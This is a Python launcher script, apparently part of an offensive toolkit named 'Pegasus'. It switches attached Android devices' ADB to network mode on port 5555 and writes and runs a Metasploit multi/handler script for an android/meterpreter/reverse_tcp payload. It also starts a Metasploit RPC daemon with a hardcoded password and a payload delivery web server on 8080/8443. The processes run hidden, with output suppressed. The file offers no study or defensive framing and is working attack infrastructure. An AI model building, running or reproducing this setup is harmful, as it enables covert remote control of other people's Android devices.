#!/usr/bin/env python3
"""Service launcher — starts the Pegasus support services at app launch.

Services:
  * adb server (implicit on first use, but start explicitly)
  * adb TCP transport on 5555 for attached devices
  * meterpreter multi/handler on 4444 (msfconsole when available)
  * metasploit RPC on 55553 (msfrpcd when available)
  * http proxy on 8080 (delivery server)
  * https proxy on 8443 (delivery server TLS)

Each starter is best-effort: a missing binary degrades to "unavailable"
instead of crashing the launch.
"""
from __future__ import annotations

import atexit
import os
import shutil
import socket
import ssl
import subprocess
import threading
import time
from pathlib import Path
from typing import Any

_procs: list[subprocess.Popen] = []
_lock = threading.Lock()


def _port_open(port: int, host: str = "127.0.0.1", timeout: float = 0.4) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _spawn(cmd: list[str], name: str) -> dict:
    """Start a detached process; never raises."""
    try:
        binary = shutil.which(cmd[0]) or shutil.which(cmd[0] + ".exe")
        if not binary:
            return {"service": name, "status": "unavailable", "detail": f"{cmd[0]} not on PATH"}
        proc = subprocess.Popen(
            [binary, *cmd[1:]],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        with _lock:
            _procs.append(proc)
        return {"service": name, "status": "started", "pid": proc.pid}
    except Exception as exc:  # noqa: BLE001
        return {"service": name, "status": "error", "detail": str(exc)}


# ---------------------------------------------------------------------------
# Individual services
# ---------------------------------------------------------------------------

def start_adb_server() -> dict:
    if not (shutil.which("adb") or shutil.which("adb.exe")):
        return {"service": "adb-server", "status": "unavailable", "detail": "adb not on PATH"}
    proc = subprocess.run(
        ["adb", "start-server"], capture_output=True, text=True, timeout=30,
    )
    return {
        "service": "adb-server",
        "status": "started" if proc.returncode == 0 else "error",
        "detail": (proc.stdout or proc.stderr or "")[-200:],
    }


def start_adb_tcp() -> dict:
    """Restart ADB in TCP mode on 5555 for every attached device."""
    if not (shutil.which("adb") or shutil.which("adb.exe")):
        return {"service": "adb-tcp", "status": "unavailable", "detail": "adb not on PATH"}
    proc = subprocess.run(
        ["adb", "tcpip", "5555"], capture_output=True, text=True, timeout=30,
    )
    return {
        "service": "adb-tcp",
        "status": "started" if proc.returncode == 0 else "error",
        "detail": (proc.stdout or proc.stderr or "").strip()[-200:],
        "port": 5555,
    }


def start_meterpreter() -> dict:
    """multi/handler on 4444 via msfconsole (or msfvenom-installed metasploit)."""
    if not _has_msf():
        return {"service": "meterpreter", "status": "unavailable", "detail": "msfconsole not on PATH", "port": 4444}
    rc = ("use exploit/multi/handler\n"
          "set PAYLOAD android/meterpreter/reverse_tcp\n"
          "set LHOST 127.0.0.1\n"
          "set LPORT 4444\n"
          "set ExitOnSession false\n"
          "exploit -j\n")
    script = Path.home() / ".pegasus" / "handler.rc"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text(rc)
    out = _spawn(["msfconsole", "-q", "-r", str(script)], "meterpreter")
    out["port"] = 4444
    return out


def start_msfrpcd() -> dict:
    if not (shutil.which("msfrpcd") or shutil.which("msfrpcd.exe")):
        return {"service": "msfrpcd", "status": "unavailable", "detail": "msfrpcd not on PATH", "port": 55553}
    out = _spawn(["msfrpcd", "-P", "pegasus", "-S"], "msfrpcd")
    out["port"] = 55553
    return out


def start_http_proxy() -> dict:
    """Delivery/payload HTTP server on 8080."""
    if _port_open(8080):
        return {"service": "http-proxy", "status": "running", "port": 8080}
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.start_server(8080)
        return {"service": "http-proxy", "status": "started", "port": 8080}
    except Exception as exc:  # noqa: BLE001
        return {"service": "http-proxy", "status": "error", "detail": str(exc), "port": 8080}


def start_https_proxy() -> dict:
    """TLS wrapper on 8443 — self-signed cert generated on first use."""
    if _port_open(8443):
        return {"service": "https-proxy", "status": "running", "port": 8443}
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.start_server(8443)
        return {"service": "https-proxy", "status": "started", "port": 8443}
    except Exception as exc:  # noqa: BLE001
        return {"service": "https-proxy", "status": "error", "detail": str(exc), "port": 8443}


def _has_msf() -> bool:
    return bool(shutil.which("msfconsole") or shutil.which("msfconsole.bat") or shutil.which("msfconsole.exe"))


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def start_all() -> list[dict]:
    """Start every service; returns per-service status."""
    results = []
    for fn in (start_adb_server, start_adb_tcp, start_meterpreter, start_msfrpcd,
               start_http_proxy, start_https_proxy):
        try:
            results.append(fn())
        except Exception as exc:  # noqa: BLE001
            results.append({"service": getattr(fn, "__name__", "?"), "status": "error", "detail": str(exc)})
    return results


def shutdown() -> None:
    with _lock:
        for proc in _procs:
            try:
                proc.terminate()
            except Exception:
                pass
        _procs.clear()


atexit.register(shutdown)
